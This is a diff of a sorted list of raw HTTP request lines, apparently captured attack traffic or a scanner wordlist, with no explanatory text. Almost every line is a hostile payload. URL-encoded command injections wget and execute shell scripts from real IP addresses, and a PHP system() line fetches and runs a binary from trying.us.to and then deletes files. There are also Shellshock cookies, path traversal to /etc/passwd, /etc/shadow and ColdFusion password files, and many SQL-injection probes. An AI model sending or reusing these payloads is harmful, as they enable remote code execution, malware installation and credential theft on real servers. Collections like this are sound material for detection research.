@@ -1,4 +1,5 @@
 
+\
 \
 %73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
 %73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%32%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
@@ -6,14 +7,8 @@
 %73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%32%31%38%2e%32%35%30%2e%32%32%36%2e%31%38%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
 %73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%36%31%2e%36%2e%30%2e%31%39%30%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
 %73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%27%23%21%2f%62%69%6e%2f%73%68%27%20%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%77%67%65%74%20%2d%4f%20%32%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%63%68%6d%6f%64%20%2b%78%20%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%2e%2f%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%31%2e%73%68%3b%2e%2f%31%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
-() {: ;}; echo; echo "HWNDLGZZCPPYGWD": () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
---- !ruby/object:Time {}\
---- !ruby/object:^@\
-<? system("cd /tmp ; wget trying.us.to/seed.jpg ; curl -O http://trying.us.to/seed.jpg ; fetch http://trying.us.to/seed.jpg ; tar -xzvf seed.jpg ; chmod +x seed ; ./seed  ; rm -rf * "); ?>
-<?php system('echo NmapCVEIdentification');die(); ?>
-<?xml version="1.0" encoding="UTF-8"?>\
-<probe type="string"><![CDATA[\
-<probe type="yaml"><![CDATA[\
+a
+Accept: */*\
 Accept-Charset: GBK\,utf-8;q=0.7\,*;q=0.3\
 Accept-Charset: ISO-8859-1\,utf-8;q=0.7\,*;q=0.7\
 Accept-Encoding: deflate\, gzip\, identity\
@@ -21,27 +16,30 @@ Accept-Encoding: gzip\
 Accept-Encoding: gzip\, deflate\
 Accept-Encoding: identity\
 Accept-Encoding: none\
-Accept-Language: en-US;q=0.6\,en;q=0.4\
+Accept: image/gif\, image/jpeg\, image/pjpeg\, image/pjpeg\, application/x-shockwave-flash\, application/x-ms-application\, application/x-ms-xbap\, application/vnd.ms-xpsdocument\, application/xaml+xml\, */*\
 Accept-Language: en-us\
 Accept-Language: en-us\,en;q=0.5\
+Accept-Language: en-US;q=0.6\,en;q=0.4\
 Accept-Language: pl\,en-US;q=0.7\,en;q=0.3\
 Accept-Language: zh-cn\
 Accept-Language: zh-cn\,zh;q=0.8\
-Accept: */*\
-Accept: image/gif\, image/jpeg\, image/pjpeg\, image/pjpeg\, application/x-shockwave-flash\, application/x-ms-application\, application/x-ms-xbap\, application/vnd.ms-xpsdocument\, application/xaml+xml\, */*\
 Accept: text/*\
-Accept: text/html\, image/gif\, image/jpeg\, *; q=.2\, */*; q=.2\
 Accept: text/html\,application/xhtml+xml\,application/xml;q=0.9\,*/*;q=0.8\
+Accept: text/html\, image/gif\, image/jpeg\, *; q=.2\, */*; q=.2\
 Authorization: Basic YWRtaW46\
 Cache-Control: max-age=0\
 Cache-Control: max-age=259200\
 Cache-Control: no-cache\
-Connection: Close\
-Connection: Keep-Alive\
-Connection: TE\, close\
+comment=%27%20OR%20sqlspider
+comment=ghz%3ehzx
+comment=hzx%22zxc
+comment=zxc%27xcv
 Connection: close
 Connection: close\
+Connection: Close\
 Connection: keep-alive\
+Connection: Keep-Alive\
+Connection: TE\, close\
 Content-Length: 0\
 Content-Length: 1\
 Content-Length: 100\
@@ -60,44 +58,42 @@ Content-Length: 86\
 Content-Length: 934\
 Content-Length: 940\
 Content-Length: 946\
-Content-Type: application/x-www-form-urlencoded\
 Content-Type: application/xml\
+Content-Type: application/x-www-form-urlencoded\
 Content-Type: text/html\
 Cookie: () { :;}; /bin/bash -c "ping 212.47.238.143 -c 1"\
 Cookie: () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
+() {: ;}; echo; echo "HWNDLGZZCPPYGWD": () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
 Expect: 100-continue\
-GET / HTTP/1.0
-GET / HTTP/1.0\
-GET / HTTP/1.1
-GET / HTTP/1.1\
-GET /%2A.php?inf=%27%20OR%20sqlspider HTTP/1.1\
-GET /%2A.php?mode= HTTP/1.1\
-GET /%2A.php?mode=%27%20OR%20sqlspider HTTP/1.1\
-GET /%2A.php?pg=%27%20OR%20sqlspider HTTP/1.1\
+GET /19a7065f9aacf4e2811a29e43bcf4b96d56154a0.htm HTTP/1.1\
 GET /%2Ainc%2A.php?base_dir=%27%20OR%20sqlspider HTTP/1.1\
 GET /%2Ainc%2A.php?get=%27%20OR%20sqlspider HTTP/1.1\
 GET /%2Ainc%2A.php?m=%27%20OR%20sqlspider HTTP/1.1\
-GET /%5C HTTP/1.1\
-GET /%5C../%5C../%5C../boot.ini HTTP/1.1\
-GET /..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini HTTP/1.1\
+GET /%2A.php?inf=%27%20OR%20sqlspider HTTP/1.1\
+GET /%2A.php?mode=%27%20OR%20sqlspider HTTP/1.1\
+GET /%2A.php?mode= HTTP/1.1\
+GET /%2A.php?pg=%27%20OR%20sqlspider HTTP/1.1\
 GET /..%5C..%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C%5Cboot.ini HTTP/1.1\
+GET /..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini HTTP/1.1\
 GET /..%5C/%5C..%5C/%5C..%5C/%5Cboot.ini HTTP/1.1\
-GET /..%5C/..%5C/..%5C/boot.ini HTTP/1.1\
-GET /../../../../../../../etc/passwd HTTP/1.1\
-GET /.git/HEAD HTTP/1.1\
-GET ///../../../../boot.ini HTTP/1.1\
 GET ////..%5C..%5C..%5Cboot.ini HTTP/1.1\
-GET //MyAdmin/scripts/setup.php HTTP/1.1\
-GET //PHPMyAdmin/scripts/setup.php HTTP/1.1\
-GET //_vti_inf.html HTTP/1.1\
-GET //cmdownloads/?CMDsearch=%22%2ebase64_decode%28%22VlBRVlJHRkhUQU9TSlRJ%22%29%2e%22 HTTP/1.1\
-GET //myadmin/scripts/setup.php HTTP/1.1\
-GET //phpMyAdmin/scripts/setup.php HTTP/1.1\
-GET //phpmyadmin/scripts/setup.php HTTP/1.1\
-GET //pma/scripts/setup.php HTTP/1.1\
-GET //wp-login.php HTTP/1.1\
-GET /19a7065f9aacf4e2811a29e43bcf4b96d56154a0.htm HTTP/1.1\
-GET /?author=1 HTTP/1.1\
+GET /..%5C/..%5C/..%5C/boot.ini HTTP/1.1\
+GET /%5C../%5C../%5C../boot.ini HTTP/1.1\
+GET /%5C HTTP/1.1\
+GET /adcycle HTTP/1.1\
+GET /add.asp?bookid=%27%20OR%20sqlspider HTTP/1.1\
+GET /administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=%27%20OR%20sqlspider HTTP/1.1\
+GET /administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
+GET /admin.php?page=%27%20OR%20sqlspider HTTP/1.1\
+GET /advSearch_h.asp?idCategory=%27%20OR%20sqlspider HTTP/1.1\
+GET /affiliate-agreement.cfm?storeid=%27%20OR%20sqlspider HTTP/1.1\
+GET /agenda.php?t=%27%20OR%20sqlspider HTTP/1.1\
+GET /aktuelles.php?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /ansprechpartner.php?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /artigos.php?tipo=%27%20OR%20sqlspider HTTP/1.1\
+GET /artikel.php?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /ashnews.php?pathtoashnews=%27%20OR%20sqlspider HTTP/1.1\
+GET /assistenza.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /?author=10 HTTP/1.1\
 GET /?author=11 HTTP/1.1\
 GET /?author=12 HTTP/1.1\
@@ -108,13 +104,14 @@ GET /?author=16 HTTP/1.1\
 GET /?author=17 HTTP/1.1\
 GET /?author=18 HTTP/1.1\
 GET /?author=19 HTTP/1.1\
-GET /?author=2 HTTP/1.1\
+GET /?author=1 HTTP/1.1\
 GET /?author=20 HTTP/1.1\
 GET /?author=21 HTTP/1.1\
 GET /?author=22 HTTP/1.1\
 GET /?author=23 HTTP/1.1\
 GET /?author=24 HTTP/1.1\
 GET /?author=25 HTTP/1.1\
+GET /?author=2 HTTP/1.1\
 GET /?author=3 HTTP/1.1\
 GET /?author=4 HTTP/1.1\
 GET /?author=5 HTTP/1.1\
@@ -122,78 +119,58 @@ GET /?author=6 HTTP/1.1\
 GET /?author=7 HTTP/1.1\
 GET /?author=8 HTTP/1.1\
 GET /?author=9 HTTP/1.1\
-GET /Browse_Item_Details.asp?Store_Id=%27%20OR%20sqlspider HTTP/1.1\
-GET /CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true HTTP/1.1\
-GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties%00en HTTP/1.1\
-GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en HTTP/1.1\
-GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en HTTP/1.1\
-GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en HTTP/1.1\
-GET /Listadeparametros.html HTTP/1.1\
-GET /Nmap/folder/check1448289400 HTTP/1.1\
-GET /Nmap/folder/check1448289401 HTTP/1.1\
-GET /NmapUpperCheck1448289400 HTTP/1.1\
-GET /NmapUpperCheck1448289401 HTTP/1.1\
-GET /Stray-Questions-View.php?num=%27%20OR%20sqlspider HTTP/1.1\
-GET /XMII/Illuminator HTTP/1.0
-GET /adcycle HTTP/1.1\
-GET /add.asp?bookid=%27%20OR%20sqlspider HTTP/1.1\
-GET /admin.php?page=%27%20OR%20sqlspider HTTP/1.1\
-GET /administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=%27%20OR%20sqlspider HTTP/1.1\
-GET /administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
-GET /advSearch_h.asp?idCategory=%27%20OR%20sqlspider HTTP/1.1\
-GET /affiliate-agreement.cfm?storeid=%27%20OR%20sqlspider HTTP/1.1\
-GET /agenda.php?t=%27%20OR%20sqlspider HTTP/1.1\
-GET /aktuelles.php?id=%27%20OR%20sqlspider HTTP/1.1\
-GET /ansprechpartner.php?id=%27%20OR%20sqlspider HTTP/1.1\
-GET /artigos.php?tipo=%27%20OR%20sqlspider HTTP/1.1\
-GET /artikel.php?id=%27%20OR%20sqlspider HTTP/1.1\
-GET /ashnews.php?pathtoashnews=%27%20OR%20sqlspider HTTP/1.1\
-GET /assistenza.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /axis2/services/listServices HTTP/1.1\
 GET /b2-tools/gm-2-b2.php?b2inc=%27%20OR%20sqlspider HTTP/1.1\
 GET /base.php?ir=%27%20OR%20sqlspider HTTP/1.1\
 GET /base.php?k=%27%20OR%20sqlspider HTTP/1.1\
-GET /base.php?pa= HTTP/1.1\
 GET /base.php?pa=%27%20OR%20sqlspider HTTP/1.1\
 GET /base.php?pageweb=%27%20OR%20sqlspider HTTP/1.1\
+GET /base.php?pa= HTTP/1.1\
 GET /base.php?rub=%27%20OR%20sqlspider HTTP/1.1\
 GET /base.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
 GET /becommunity/community/index.php?pageurl=%27%20OR%20sqlspider HTTP/1.1\
-GET /blank.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
 GET /blank.php?abre=%27%20OR%20sqlspider HTTP/1.1\
-GET /blank.php?channel= HTTP/1.1\
 GET /blank.php?channel=%27%20OR%20sqlspider HTTP/1.1\
+GET /blank.php?channel= HTTP/1.1\
 GET /blank.php?h=%27%20OR%20sqlspider HTTP/1.1\
 GET /blank.php?menu=%27%20OR%20sqlspider HTTP/1.1\
+GET /blank.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
 GET /blank.php?pagina=%27%20OR%20sqlspider HTTP/1.1\
 GET /blank.php?pr=%27%20OR%20sqlspider HTTP/1.1\
 GET /blank.php?qry=%27%20OR%20sqlspider HTTP/1.1\
 GET /blank.php?url=%27%20OR%20sqlspider HTTP/1.1\
 GET /blog//wp-login.php HTTP/1.1\
+GET ///../../../../boot.ini HTTP/1.1\
+GET /Browse_Item_Details.asp?Store_Id=%27%20OR%20sqlspider HTTP/1.1\
 GET /buy.asp?=%27%20OR%20sqlspider HTTP/1.1\
 GET /bycategory.asp?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /calendario.php?dia=%27%20OR%20sqlspider HTTP/1.1\
 GET /candidate.php?ID=%27%20OR%20sqlspider HTTP/1.1\
-GET /cars.php?page= HTTP/1.1\
 GET /cars.php?page=%27%20OR%20sqlspider HTTP/1.1\
+GET /cars.php?page= HTTP/1.1\
 GET /cart.asp?cart_id=%27%20OR%20sqlspider HTTP/1.1\
 GET /catalog_main.asp?catid=%27%20OR%20sqlspider HTTP/1.1\
 GET /cd.php?id=%27%20OR%20sqlspider HTTP/1.1\
-GET /cgi-bin/Browse_Item_Details.asp?Store_Id=%27%20OR%20sqlspider HTTP/1.1\
+GET /CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true HTTP/1.1\
+GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en HTTP/1.1\
+GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en HTTP/1.1\
+GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en HTTP/1.1\
+GET /CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties%00en HTTP/1.1\
 GET /cgi-bin/base.php?rub=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/blank.php?h=%27%20OR%20sqlspider HTTP/1.1\
+GET /cgi-bin/Browse_Item_Details.asp?Store_Id=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/customerService.asp?TextID1=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/default.php?ki=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/dossier.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/enter.php?left=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/events.asp?ID=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/gallery.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
+GET /cgi-bin/index_en.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/index.php?addr=%27%20OR%20sqlspider HTTP/1.1\
-GET /cgi-bin/index.php?cPath=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/index.php?configFile=%27%20OR%20sqlspider HTTP/1.1\
+GET /cgi-bin/index.php?cPath=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/index.php?pollname=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/index.php?where=%27%20OR%20sqlspider HTTP/1.1\
-GET /cgi-bin/index_en.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/info.php?home=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/info.php?o=%27%20OR%20sqlspider HTTP/1.1\
 GET /cgi-bin/main.php?loc=%27%20OR%20sqlspider HTTP/1.1\
@@ -221,6 +198,7 @@ GET /cgi-bin/visadmin.exe HTTP/1.0\
 GET /chisiamo.php?a=%27%20OR%20sqlspider HTTP/1.1\
 GET /clanek.php4?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /clientaccesspolicy.xml HTTP/1.1\
+GET //cmdownloads/?CMDsearch=%22%2ebase64_decode%28%22VlBRVlJHRkhUQU9TSlRJ%22%29%2e%22 HTTP/1.1\
 GET /colunas.php?id_colunista=%27%20OR%20sqlspider HTTP/1.1\
 GET /comersus_optReviewReadExec.asp?idProduct=%27%20OR%20sqlspider HTTP/1.1\
 GET /components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=%27%20OR%20sqlspider HTTP/1.1\
@@ -238,10 +216,10 @@ GET /default.php?eval=%27%20OR%20sqlspider HTTP/1.1\
 GET /default.php?incl=%27%20OR%20sqlspider HTTP/1.1\
 GET /default.php?ki=%27%20OR%20sqlspider HTTP/1.1\
 GET /default.php?secao=%27%20OR%20sqlspider HTTP/1.1\
-GET /default.php?showpage= HTTP/1.1\
 GET /default.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
-GET /default.php?str= HTTP/1.1\
+GET /default.php?showpage= HTTP/1.1\
 GET /default.php?str=%27%20OR%20sqlspider HTTP/1.1\
+GET /default.php?str= HTTP/1.1\
 GET /default.php?t=%27%20OR%20sqlspider HTTP/1.1\
 GET /default.php?x=%27%20OR%20sqlspider HTTP/1.1\
 GET /default.php?y=%27%20OR%20sqlspider HTTP/1.1\
@@ -254,8 +232,8 @@ GET /down%2A.php?lang=%27%20OR%20sqlspider HTTP/1.1\
 GET /down%2A.php?second=%27%20OR%20sqlspider HTTP/1.1\
 GET /down%2A.php?t=%27%20OR%20sqlspider HTTP/1.1\
 GET /down%2A.php?texto=%27%20OR%20sqlspider HTTP/1.1\
-GET /downloads_info.php?id= HTTP/1.1\
 GET /downloads_info.php?id=%27%20OR%20sqlspider HTTP/1.1\
+GET /downloads_info.php?id= HTTP/1.1\
 GET /emailproduct.asp?itemid=%27%20OR%20sqlspider HTTP/1.1\
 GET /enter.php?addr=%27%20OR%20sqlspider HTTP/1.1\
 GET /enter.php?base_dir=%27%20OR%20sqlspider HTTP/1.1\
@@ -273,8 +251,8 @@ GET /enter.php?ref=%27%20OR%20sqlspider HTTP/1.1\
 GET /enter.php?sec=%27%20OR%20sqlspider HTTP/1.1\
 GET /enter.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
 GET /enter.php?type=%27%20OR%20sqlspider HTTP/1.1\
-GET /enter.php?y= HTTP/1.1\
 GET /enter.php?y=%27%20OR%20sqlspider HTTP/1.1\
+GET /enter.php?y= HTTP/1.1\
 GET /epgrec/%2Ainc%2A.php?str= HTTP/1.1\
 GET /epgrec/base.php?middle= HTTP/1.1\
 GET /epgrec/do-record.sh HTTP/1.1\
@@ -296,6 +274,7 @@ GET /epgrec/sub%2A.php?mid= HTTP/1.1\
 GET /epgrec/template.php?ref= HTTP/1.1\
 GET /epgrec/view.php?pollname= HTTP/1.1\
 GET /es/index.php?action=%27%20OR%20sqlspider HTTP/1.1\
+GET /../../../../../../../etc/passwd HTTP/1.1\
 GET /event.php?id=%27%20OR%20sqlspider HTTP/1.1\
 GET /events.asp?ID=%27%20OR%20sqlspider HTTP/1.1\
 GET /explorer.cfm HTTP/1.1\
@@ -326,61 +305,51 @@ GET /general.php?pre=%27%20OR%20sqlspider HTTP/1.1\
 GET /general.php?sekce=%27%20OR%20sqlspider HTTP/1.1\
 GET /general.php?var=%27%20OR%20sqlspider HTTP/1.1\
 GET /general.php?xlink=%27%20OR%20sqlspider HTTP/1.1\
+GET /.git/HEAD HTTP/1.1\
 GET /head.php?incl=%27%20OR%20sqlspider HTTP/1.1\
 GET /head.php?ki=%27%20OR%20sqlspider HTTP/1.1\
 GET /head.php?mod=%27%20OR%20sqlspider HTTP/1.1\
-GET /head.php?opcion= HTTP/1.1\
 GET /head.php?opcion=%27%20OR%20sqlspider HTTP/1.1\
+GET /head.php?opcion= HTTP/1.1\
 GET /head.php?ref=%27%20OR%20sqlspider HTTP/1.1\
 GET /head.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
 GET /head.php?str=%27%20OR%20sqlspider HTTP/1.1\
-GET /help.php?css_path=%27%20OR%20sqlspider HTTP/1.1\
 GET /help/../../etc/shadow HTTP/1.1\
+GET /help.php?css_path=%27%20OR%20sqlspider HTTP/1.1\
 GET /home.asp HTTP/1.1\
+GET /homepage.php?rid=%27%20OR%20sqlspider HTTP/1.1\
 GET /home.php?addr=%27%20OR%20sqlspider HTTP/1.1\
 GET /home.php?b=%27%20OR%20sqlspider HTTP/1.1\
 GET /home.php?channel=%27%20OR%20sqlspider HTTP/1.1\
 GET /home.php?link=%27%20OR%20sqlspider HTTP/1.1\
 GET /home.php?path=%27%20OR%20sqlspider HTTP/1.1\
 GET /home.php?secao=%27%20OR%20sqlspider HTTP/1.1\
-GET /homepage.php?rid=%27%20OR%20sqlspider HTTP/1.1\
 GET /htmltonuke.php?filnavn=%27%20OR%20sqlspider HTTP/1.1\
+GET / HTTP/1.0
+GET / HTTP/1.0\
+GET / HTTP/1.1
+GET / HTTP/1.1\
+GET http://162.252.240.124:80/gw.php HTTP/1.1\
+GET http://24x7-allrequestsallowed.com/?PHPSESSID=aab45f4f00143PWPJWTGYCMZJ%40%5B HTTP/1.1\
+GET http://24x7-allrequestsallowed.com/?PHPSESSID=tt2adea600143PWPJWTGYCMZJ%40%5B HTTP/1.1\
+GET http://51.254.206.142/httptest.php HTTP/1.1\
+GET https://m.baidu.com/ HTTP/1.1\
+GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1\
+GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1\
+GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1\
+GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1\
+GET HTTP://www.baidu.com/ HTTP/1.1\
+GET http://www.baidu.com/robots.txt HTTP/1.1\
+GET http://www.google.pl/search?q=wczasy&num=100&start=100 HTTP/1.1\
+GET http://www.ip.cn HTTP/1.1\
+GET http://www.wikipedia.org/ HTTP/1.1\
 GET /inc/header.php/step_one.php?server_inc=%27%20OR%20sqlspider HTTP/1.1\
 GET /include.php?index=%27%20OR%20sqlspider HTTP/1.1\
 GET /include.php?path=%27%20OR%20sqlspider HTTP/1.1\
 GET /include.php?sec=%27%20OR%20sqlspider HTTP/1.1\
 GET /include.php?sivu=%27%20OR%20sqlspider HTTP/1.1\
-GET /include/write.php?dir=%27%20OR%20sqlspider HTTP/1.1\
 GET /includes/setup.php?phpc_root_path=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.inc.php?PATH_Includes=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php HTTP/1.1\
-GET /index.php?_REQUEST=%27%20OR%20sqlspider&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
-GET /index.php?_REQUEST=&GLOBALS=%27%20OR%20sqlspider&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
-GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=%27%20OR%20sqlspider&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1 HTTP/1.1\
-GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content%27%20OR%20sqlspider&_REQUEST%5bItemid%5d=1 HTTP/1.1\
-GET /index.php?_REQUEST=&GLOBALS=&mosConfig_absolute_path=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?addr=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?cPath=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?configFile=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?conteudo=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?data_id=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?disp=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?filename=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?filepath=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?id_categoria=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?inc=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?inhalt=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?lang=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?nic=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?opcao=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?opcion=%27%20OR%20sqlspider HTTP/1.1\
-GET /index.php?pagename=%27%20OR%20sqlspider HTTP/1.1\
